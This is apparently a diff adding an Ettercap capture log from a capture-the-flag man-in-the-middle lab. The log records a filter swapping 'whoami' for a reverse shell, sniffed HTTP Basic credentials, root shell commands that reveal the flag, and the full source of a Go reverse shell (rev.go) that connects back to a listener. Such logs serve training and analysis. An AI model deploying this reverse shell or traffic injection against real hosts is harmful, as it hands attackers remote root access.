@@ -2529,3 +2529,1269 @@ TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
 
 Mon Feb  6 17:46:42 2023 [377326]
 TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (4)
+pwd
+
+Mon Feb  6 17:46:42 2023 [380998]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:42 2023 [381285]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | AP (6)
+/root
+
+Mon Feb  6 17:46:42 2023 [389117]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | A (0)
+
+Mon Feb  6 17:46:42 2023 [777554]
+TCP  192.168.12.10:48204 --> 192.168.12.20:80 | S (0)
+
+Mon Feb  6 17:46:42 2023 [781072]
+TCP  192.168.12.20:80 --> 192.168.12.10:48204 | SA (0)
+
+Mon Feb  6 17:46:42 2023 [788969]
+TCP  192.168.12.10:48204 --> 192.168.12.20:80 | A (0)
+HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
+
+Mon Feb  6 17:46:42 2023 [789366]
+TCP  192.168.12.10:48204 --> 192.168.12.20:80 | AP (133)
+GET /test.txt HTTP/1.1.
+Host: www.server.bob.
+Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
+User-Agent: curl/7.68.0.
+Accept: */*.
+.
+
+Mon Feb  6 17:46:42 2023 [797068]
+TCP  192.168.12.20:80 --> 192.168.12.10:48204 | A (0)
+
+Mon Feb  6 17:46:42 2023 [799122]
+TCP  192.168.12.20:80 --> 192.168.12.10:48204 | AP (17)
+HTTP/1.0 200 OK.
+
+Mon Feb  6 17:46:42 2023 [799341]
+TCP  192.168.12.20:80 --> 192.168.12.10:48204 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+
+Mon Feb  6 17:46:42 2023 [805059]
+TCP  192.168.12.10:48204 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:46:42 2023 [805936]
+TCP  192.168.12.10:48204 --> 192.168.12.20:80 | FA (0)
+
+Mon Feb  6 17:46:42 2023 [813104]
+TCP  192.168.12.20:80 --> 192.168.12.10:48204 | A (0)
+
+Mon Feb  6 17:46:45 2023 [12904]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (3)
+ls
+
+Mon Feb  6 17:46:45 2023 [21015]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:46 2023 [378420]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (3)
+ls
+
+Mon Feb  6 17:46:46 2023 [380965]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:46 2023 [382253]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | AP (30)
+rev.go
+root.txt
+server.sh
+www
+
+Mon Feb  6 17:46:46 2023 [389002]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | A (0)
+
+Mon Feb  6 17:46:49 2023 [14035]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:46:49 2023 [20989]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:50 2023 [379541]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:46:50 2023 [381001]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:51 2023 [809202]
+TCP  192.168.12.20:34772 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:46:51 2023 [809242]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34772 | SA (0)
+
+Mon Feb  6 17:46:51 2023 [809357]
+TCP  192.168.12.20:34772 --> 192.168.12.66:6666 | A (0)
+
+Mon Feb  6 17:46:51 2023 [897959]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | S (0)
+
+Mon Feb  6 17:46:51 2023 [901057]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | SA (0)
+
+Mon Feb  6 17:46:51 2023 [908911]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:51 2023 [928788]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:46:51 2023 [932967]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:52 2023 [610340]
+TCP  192.168.12.20:34776 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:46:53 2023 [15206]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (4)
+pwd
+
+Mon Feb  6 17:46:53 2023 [21058]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:53 2023 [624858]
+TCP  192.168.12.20:34776 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:46:54 2023 [380753]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (4)
+pwd
+
+Mon Feb  6 17:46:54 2023 [388948]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:54 2023 [827445]
+TCP  192.168.12.10:48212 --> 192.168.12.20:80 | S (0)
+
+Mon Feb  6 17:46:54 2023 [829001]
+TCP  192.168.12.20:80 --> 192.168.12.10:48212 | SA (0)
+
+Mon Feb  6 17:46:54 2023 [836918]
+TCP  192.168.12.10:48212 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:46:54 2023 [837420]
+TCP  192.168.12.10:48212 --> 192.168.12.20:80 | AP (133)
+GET /test.txt HTTP/1.1.
+Host: www.server.bob.
+Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
+User-Agent: curl/7.68.0.
+Accept: */*.
+.
+HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
+
+Mon Feb  6 17:46:54 2023 [845146]
+TCP  192.168.12.20:80 --> 192.168.12.10:48212 | A (0)
+
+Mon Feb  6 17:46:54 2023 [847040]
+TCP  192.168.12.20:80 --> 192.168.12.10:48212 | AP (17)
+HTTP/1.0 200 OK.
+
+Mon Feb  6 17:46:54 2023 [847340]
+TCP  192.168.12.20:80 --> 192.168.12.10:48212 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+
+Mon Feb  6 17:46:54 2023 [853218]
+TCP  192.168.12.10:48212 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:46:54 2023 [854933]
+TCP  192.168.12.10:48212 --> 192.168.12.20:80 | FA (0)
+
+Mon Feb  6 17:46:54 2023 [861103]
+TCP  192.168.12.20:80 --> 192.168.12.10:48212 | A (0)
+
+Mon Feb  6 17:46:55 2023 [640868]
+TCP  192.168.12.20:34776 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:46:55 2023 [930847]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (4)
+pwd
+
+Mon Feb  6 17:46:55 2023 [932988]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:55 2023 [933281]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | AP (6)
+/root
+
+Mon Feb  6 17:46:55 2023 [941083]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | A (0)
+
+Mon Feb  6 17:46:57 2023 [16330]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (3)
+ls
+
+Mon Feb  6 17:46:57 2023 [20992]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:57 2023 [100155]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | AP (3)
+id
+
+Mon Feb  6 17:46:57 2023 [100291]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | A (0)
+
+Mon Feb  6 17:46:57 2023 [251341]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (39)
+uid=0(root) gid=0(root) groups=0(root)
+
+Mon Feb  6 17:46:57 2023 [251361]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)
+
+Mon Feb  6 17:46:58 2023 [381777]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (3)
+ls
+
+Mon Feb  6 17:46:58 2023 [389010]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:59 2023 [599612]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | AP (7)
+whoami
+
+Mon Feb  6 17:46:59 2023 [599768]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | A (0)
+
+Mon Feb  6 17:46:59 2023 [600992]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (5)
+root
+
+Mon Feb  6 17:46:59 2023 [601005]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)
+
+Mon Feb  6 17:46:59 2023 [672951]
+TCP  192.168.12.20:34776 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:46:59 2023 [931991]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (3)
+ls
+
+Mon Feb  6 17:46:59 2023 [932969]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:59 2023 [934220]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | AP (30)
+rev.go
+root.txt
+server.sh
+www
+
+Mon Feb  6 17:46:59 2023 [941032]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | A (0)
+
+Mon Feb  6 17:47:01 2023 [17521]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:01 2023 [21016]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:02 2023 [383102]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:02 2023 [388979]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:03 2023 [932448]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:03 2023 [933029]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:04 2023 [84594]
+TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | S (0)
+
+Mon Feb  6 17:47:04 2023 [85113]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | SA (0)
+
+Mon Feb  6 17:47:04 2023 [93025]
+TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:04 2023 [103460]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (7)
+whoami
+
+Mon Feb  6 17:47:04 2023 [108951]
+TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:04 2023 [751093]
+TCP  192.168.12.20:34782 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:05 2023 [18673]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (4)
+pwd
+
+Mon Feb  6 17:47:05 2023 [20974]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:05 2023 [752853]
+TCP  192.168.12.20:34782 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:06 2023 [384250]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (4)
+pwd
+
+Mon Feb  6 17:47:06 2023 [388997]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:06 2023 [865968]
+TCP  192.168.12.10:48218 --> 192.168.12.20:80 | S (0)
+
+Mon Feb  6 17:47:06 2023 [869076]
+TCP  192.168.12.20:80 --> 192.168.12.10:48218 | SA (0)
+
+Mon Feb  6 17:47:06 2023 [877054]
+TCP  192.168.12.10:48218 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:47:06 2023 [877420]
+TCP  192.168.12.10:48218 --> 192.168.12.20:80 | AP (133)
+GET /test.txt HTTP/1.1.
+Host: www.server.bob.
+Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
+User-Agent: curl/7.68.0.
+Accept: */*.
+.
+HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
+
+Mon Feb  6 17:47:06 2023 [885128]
+TCP  192.168.12.20:80 --> 192.168.12.10:48218 | A (0)
+
+Mon Feb  6 17:47:06 2023 [887001]
+TCP  192.168.12.20:80 --> 192.168.12.10:48218 | AP (17)
+HTTP/1.0 200 OK.
+
+Mon Feb  6 17:47:06 2023 [887223]
+TCP  192.168.12.20:80 --> 192.168.12.10:48218 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+
+Mon Feb  6 17:47:06 2023 [893088]
+TCP  192.168.12.10:48218 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:47:06 2023 [894019]
+TCP  192.168.12.10:48218 --> 192.168.12.20:80 | FA (0)
+
+Mon Feb  6 17:47:06 2023 [901080]
+TCP  192.168.12.20:80 --> 192.168.12.10:48218 | A (0)
+
+Mon Feb  6 17:47:07 2023 [768862]
+TCP  192.168.12.20:34782 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:07 2023 [864865]
+TCP  192.168.12.20:34776 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:07 2023 [934907]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (4)
+pwd
+
+Mon Feb  6 17:47:07 2023 [940911]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:08 2023 [105548]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (4)
+pwd
+
+Mon Feb  6 17:47:08 2023 [108995]
+TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:08 2023 [109265]
+TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | AP (6)
+/root
+
+Mon Feb  6 17:47:08 2023 [116981]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | A (0)
+
+Mon Feb  6 17:47:09 2023 [19789]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (3)
+ls
+
+Mon Feb  6 17:47:09 2023 [21055]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:09 2023 [729423]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | AP (3)
+ls
+
+Mon Feb  6 17:47:09 2023 [729562]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | A (0)
+
+Mon Feb  6 17:47:09 2023 [730795]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (30)
+rev.go
+root.txt
+server.sh
+www
+
+Mon Feb  6 17:47:09 2023 [730806]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)
+
+Mon Feb  6 17:47:10 2023 [385429]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (3)
+ls
+
+Mon Feb  6 17:47:10 2023 [388947]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:11 2023 [935986]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (3)
+ls
+
+Mon Feb  6 17:47:11 2023 [940975]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:11 2023 [960882]
+TCP  192.168.12.20:34782 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:12 2023 [106657]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (3)
+ls
+
+Mon Feb  6 17:47:12 2023 [109001]
+TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:12 2023 [110277]
+TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | AP (30)
+rev.go
+root.txt
+server.sh
+www
+
+Mon Feb  6 17:47:12 2023 [117096]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | A (0)
+
+Mon Feb  6 17:47:13 2023 [20895]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (7)
+whoami
+
+Mon Feb  6 17:47:13 2023 [28974]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:14 2023 [74421]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | AP (13)
+cat root.txt
+
+Mon Feb  6 17:47:14 2023 [74885]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | A (0)
+
+Mon Feb  6 17:47:14 2023 [78807]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (27)
+THM{wh4t_an_ev1l_M!tM_u_R}
+
+Mon Feb  6 17:47:14 2023 [78819]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)
+
+Mon Feb  6 17:47:14 2023 [386493]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:14 2023 [389013]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:15 2023 [937134]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:15 2023 [940974]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:16 2023 [107783]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:16 2023 [109053]
+TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:16 2023 [885173]
+TCP  192.168.12.20:34786 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:17 2023 [21438]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (4)
+pwd
+
+Mon Feb  6 17:47:17 2023 [29059]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:17 2023 [374967]
+TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | S (0)
+
+Mon Feb  6 17:47:17 2023 [381095]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | SA (0)
+
+Mon Feb  6 17:47:17 2023 [388943]
+TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:17 2023 [399349]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:17 2023 [405072]
+TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:17 2023 [912841]
+TCP  192.168.12.20:34786 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:18 2023 [15922]
+TCP  192.168.12.20:34790 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:18 2023 [387573]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (4)
+pwd
+
+Mon Feb  6 17:47:18 2023 [388933]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:18 2023 [905880]
+TCP  192.168.12.10:48226 --> 192.168.12.20:80 | S (0)
+
+Mon Feb  6 17:47:18 2023 [909111]
+TCP  192.168.12.20:80 --> 192.168.12.10:48226 | SA (0)
+
+Mon Feb  6 17:47:18 2023 [917005]
+TCP  192.168.12.10:48226 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:47:18 2023 [917402]
+TCP  192.168.12.10:48226 --> 192.168.12.20:80 | AP (133)
+GET /test.txt HTTP/1.1.
+Host: www.server.bob.
+Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
+User-Agent: curl/7.68.0.
+Accept: */*.
+.
+HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
+
+Mon Feb  6 17:47:18 2023 [925141]
+TCP  192.168.12.20:80 --> 192.168.12.10:48226 | A (0)
+
+Mon Feb  6 17:47:18 2023 [927075]
+TCP  192.168.12.20:80 --> 192.168.12.10:48226 | AP (17)
+HTTP/1.0 200 OK.
+
+Mon Feb  6 17:47:18 2023 [927299]
+TCP  192.168.12.20:80 --> 192.168.12.10:48226 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+
+Mon Feb  6 17:47:18 2023 [932986]
+TCP  192.168.12.10:48226 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:47:18 2023 [933938]
+TCP  192.168.12.10:48226 --> 192.168.12.20:80 | FA (0)
+
+Mon Feb  6 17:47:18 2023 [941200]
+TCP  192.168.12.20:80 --> 192.168.12.10:48226 | A (0)
+
+Mon Feb  6 17:47:19 2023 [32834]
+TCP  192.168.12.20:34790 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:19 2023 [928862]
+TCP  192.168.12.20:34786 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:19 2023 [938259]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (4)
+pwd
+
+Mon Feb  6 17:47:19 2023 [940913]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:20 2023 [108914]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (4)
+pwd
+
+Mon Feb  6 17:47:20 2023 [116997]
+TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:20 2023 [152799]
+TCP  192.168.12.20:34782 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:21 2023 [23562]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (3)
+ls
+
+Mon Feb  6 17:47:21 2023 [28969]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:21 2023 [48932]
+TCP  192.168.12.20:34790 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:21 2023 [401398]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | AP (4)
+pwd
+
+Mon Feb  6 17:47:21 2023 [405001]
+TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:21 2023 [405282]
+TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | AP (6)
+/root
+
+Mon Feb  6 17:47:21 2023 [413027]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | A (0)
+
+Mon Feb  6 17:47:22 2023 [388642]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (3)
+ls
+
+Mon Feb  6 17:47:22 2023 [388937]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:23 2023 [939337]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (3)
+ls
+
+Mon Feb  6 17:47:23 2023 [940993]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:23 2023 [992895]
+TCP  192.168.12.20:34786 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:23 2023 [992919]
+TCP  192.168.12.20:34776 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:24 2023 [110042]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (3)
+ls
+
+Mon Feb  6 17:47:24 2023 [117039]
+TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:24 2023 [428194]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | AP (11)
+cat rev.go
+
+Mon Feb  6 17:47:24 2023 [429294]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (175)
+package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.12.10:4444");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}
+
+Mon Feb  6 17:47:24 2023 [429313]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)
+
+Mon Feb  6 17:47:25 2023 [24703]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:25 2023 [28974]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:25 2023 [272905]
+TCP  192.168.12.20:34790 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:25 2023 [402490]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | AP (3)
+ls
+
+Mon Feb  6 17:47:25 2023 [405197]
+TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:25 2023 [406505]
+TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | AP (30)
+rev.go
+root.txt
+server.sh
+www
+
+Mon Feb  6 17:47:25 2023 [413112]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | A (0)
+
+Mon Feb  6 17:47:26 2023 [389787]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:26 2023 [397027]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:27 2023 [940440]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:27 2023 [940958]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:28 2023 [111204]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (7)
+whoami
+
+Mon Feb  6 17:47:28 2023 [116961]
+TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:29 2023 [25845]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (4)
+pwd
+
+Mon Feb  6 17:47:29 2023 [28972]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:29 2023 [403607]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | AP (7)
+whoami
+
+Mon Feb  6 17:47:29 2023 [405027]
+TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:30 2023 [401994]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (4)
+pwd
+
+Mon Feb  6 17:47:30 2023 [405044]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:30 2023 [690927]
+TCP  192.168.12.20:34794 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:30 2023 [803361]
+TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | S (0)
+
+Mon Feb  6 17:47:30 2023 [805073]
